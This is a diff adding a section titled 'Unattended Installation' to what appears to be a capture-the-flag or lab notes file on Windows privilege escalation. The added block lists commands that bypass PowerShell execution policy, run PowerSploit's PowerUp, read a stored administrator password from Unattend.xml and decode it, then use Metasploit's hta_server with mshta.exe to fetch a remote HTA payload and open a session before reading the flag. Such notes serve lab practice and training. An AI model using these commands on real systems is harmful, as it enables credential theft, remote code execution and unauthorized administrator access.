@@ -602,9 +602,34 @@ getuid
 cat C:\\Users\\Administrator\\Desktop\\flag.txt
 
 ```
+33)  Unattended Installation
 
-
-
+```
+open powershell
+whoami
+Powershell.exe
+cd .\Desktop\PowerSploit\Privesc\
+ls
+powershell -ep bypass (PowerShell execution policy bypass)
+. .\PowerUp.ps1
+Invoke-PrivescAudit
+cat C:\Windows\Panther\Unattend.xml
+$password='QWRtaW5AMTIz'
+$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
+echo $password
+runas.exe /user:administrator cmd
+Admin@123  # Enter the password
+whoami
+msfconsole -q
+use exploit/windows/misc/hta_server
+exploit
+mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta (#Enter the url)
+sessions -i 1
+cd /
+cd C:\\Users\\Administrator\\Desktop
+dir
+cat flag.txt
+```
 
 
 
